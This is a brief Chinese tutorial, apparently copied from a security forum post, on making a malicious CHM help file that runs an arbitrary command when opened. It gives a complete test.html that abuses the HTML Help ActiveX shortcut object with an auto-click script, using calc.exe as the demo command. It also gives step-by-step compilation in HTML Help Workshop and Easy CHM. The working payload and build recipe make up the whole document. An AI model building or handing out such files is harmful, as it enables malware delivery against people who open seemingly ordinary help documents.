# 恶意chm文件生成

恶意chm文件生成，打开则执行任意命令。  
任选一个工具操作后，就可以生成chm文件。  

准备test.html  
```html
<html>

<head>
    <title>test</title>
</head>

<body>
    <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
        <PARAM name="Command" value="ShortCut">
        <PARAM name="Button" value="Bitmap::shortcut">
        <PARAM name="Item1" value=",calc.exe">
        <PARAM name="Item2" value="273,1,1">
    </OBJECT>

    <SCRIPT>
        x.Click();
    </SCRIPT>
</body>

</html>
```

## 工具1-HTML Help Workshop
微软自己的`HTML Help Workshop`官方下载地址已经404了，可以参照这个链接在webarchive网站下载`HTML Help Workshop`：  
https://docs.microsoft.com/en-us/answers/questions/265752/htmlhelp-workshop-download-for-chm-compiler-instal.html  
1. http://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe  
2. http://web.archive.org/web/20160314043751/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/helpdocs.zip  

安装之后，打开 `HTML Help Workshop`，  
File->New->Project->Ok->下一步，输入项目名，可以选择路径  
下一步，勾选"HTML files (.htm)"，下一步  
Add，添加test.html，下一步->完成  
File->Compile... 或者 点击第3个图标，即可生成chm文件  


## 工具2-Easy chm
下载安装`Easy chm`，随便搜一个下载，装到虚拟机里。  
把test.html放在一个文件夹里  
运行Easy CHM，新建项目，打开准备好的文件夹，编译->生成CHM 即可生成chm文件  


## 演示
打开新生成的chm文件，计算器就会被打开。  


原链接: https://bbs.pediy.com/thread-267038.htm  


2021/10/18  
